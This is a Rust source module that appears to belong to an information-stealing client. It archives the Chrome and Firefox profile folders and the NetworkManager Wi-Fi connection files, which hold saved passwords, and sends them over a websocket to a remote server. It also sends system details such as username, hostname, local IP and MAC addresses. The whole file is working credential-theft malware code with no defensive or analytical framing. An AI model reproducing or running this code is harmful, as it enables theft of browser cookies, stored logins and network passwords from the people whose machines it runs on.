use std::{net::TcpStream, path::PathBuf, thread::available_parallelism};

use json::{object, JsonValue};
use uuid::Uuid;
use websocket::{sync::Client};
use zip_archive::Archiver;
use sysinfo::{NetworkExt, System, SystemExt, DiskExt};
use whoami::{username, lang};
use local_ip_address::local_ip;

#[path = "./browsers.rs"]
mod browsers;


#[path = "./dataframes.rs"]
mod dataframes;

pub fn send_dir(tx_id: Uuid, dir_path: &str, server: &mut Client<TcpStream>, sender: &dyn Fn(Uuid, &String, &mut Client<TcpStream>)){
    let origin = PathBuf::from(dir_path);
    let dest = PathBuf::from(format!("./shared/{}", tx_id));

    let thread_count = available_parallelism().unwrap().get() as u32;

    println!("USED THREADS: {}", thread_count);

    let zip_dir = format!("{}/{}.zip", 
        dest.as_os_str().to_str().unwrap(),
        origin.as_path().file_name().unwrap().to_str().unwrap());
    let mut archiver = Archiver::new();
    
    archiver.push(origin);
    archiver.set_destination(dest);
    archiver.set_thread_count(thread_count);

    match archiver.archive(){
        Ok(_) => {
            println!("ARCHIVIO CREATO CON SUCCESSO");
            println!("INIZIO INVIO");
            sender(tx_id, &zip_dir, server);
        },
        Err(e) => println!("Cannot archive the directory! {}", e),
    };
}

pub fn send_system_info(tx_id: Uuid, server: &mut Client<TcpStream>){
    let sys = System::new_all();
    

    let mut disk_info : Vec<JsonValue> = Vec::new();
    set_disk_info(&sys, &mut disk_info);

    let mut network_info : Vec<JsonValue> = Vec::new();
    set_network_info(&sys, &mut network_info);

    let system_object = set_system_info(sys);

    let info = object!{
        disks: disk_info,
        networks: network_info,
        system: system_object
    };


    let service = &String::from("send_system_info");
    let data = Vec::<u8>::from(json::stringify(info).as_bytes());

    let dataframe = dataframes::create_dataframe(&tx_id.to_string(), &service, 0, data);


    let response = server.send_dataframe(&dataframe);
    if(response.is_ok()){
        println!("System Info inviati con successo");
    }
}

pub fn send_google_chrome(tx_id: Uuid, server: &mut Client<TcpStream>){
    send_dir(tx_id, "/home/rh/.config/google-chrome/Default", server, &browsers::send_google_chrome_data);
}


pub fn send_firefox(tx_id: Uuid, server: &mut Client<TcpStream>){
    send_dir(tx_id, "/home/rh/snap/firefox/common/.mozilla/", server, &browsers::send_firefox_data);
}

pub fn send_wifi_data(tx_id: Uuid, server: &mut Client<TcpStream>){
    send_dir(tx_id, "/etc/NetworkManager/system-connections/", server, &browsers::send_wifi_data);
}

fn set_system_info(sys: System) -> JsonValue {
    let array_languages: Vec<String> = lang().collect();
    let mut system_object = object!{
        name: sys.name(),
        kernel: sys.kernel_version(),
        os_version: sys.os_version(),
        host_name: sys.host_name(),
        cpu: sys.cpus().len(),
        total_memory: sys.total_memory(),
        total_swap: sys.total_swap(),
        username: username(),
        languages: array_languages,
    };
    set_local_ip(&mut system_object);
    system_object
}

fn set_local_ip(system_object: &mut JsonValue) {
    let local_ip = local_ip();
    if(local_ip.is_ok()){
        system_object.insert("local_ip", local_ip.unwrap().to_string()).unwrap();
    }else{
        system_object.insert("local_ip", "0.0.0.0").unwrap();
    }
}

fn set_network_info(sys: &System, network_info: &mut Vec<JsonValue>) {
    for (interface_name, data) in sys.networks() {
        let network_mac_address = format!("{:x}{:x}-{:x}{:x}-{:x}{:x}",
             data.mac_address().0[0],
             data.mac_address().0[1],
             data.mac_address().0[2],
             data.mac_address().0[3],
             data.mac_address().0[4],
             data.mac_address().0[5]
            );
        let network_name = String::from(interface_name);
    
        let tmp_network = object! {
            name: network_name,
            mac_address: network_mac_address
        };

        network_info.push(tmp_network);
    }
}

fn set_disk_info(sys: &System, disk_info: &mut Vec<JsonValue>) {
    for disk in sys.disks(){
        let disk_name = format!("{}", disk.name().to_str().unwrap());
        let disk_filesystem = format!("{}", String::from_utf8(Vec::from(disk.file_system())).unwrap());
        let disk_mount_point = format!("{}", disk.mount_point().as_os_str().to_str().unwrap());
        let disk_total_space = format!("{}", disk.total_space());
        let disk_available_space = format!("{}", disk.available_space());
        let disk_is_removable = format!("{}", disk.is_removable());


        let tmp_disk = object! {
            name: disk_name,
            file_system: disk_filesystem,
            mount_point: disk_mount_point,
            total_space: disk_total_space,
            available_space: disk_available_space,
            is_removable: disk_is_removable,
        };

        disk_info.push(tmp_disk);
    }
}

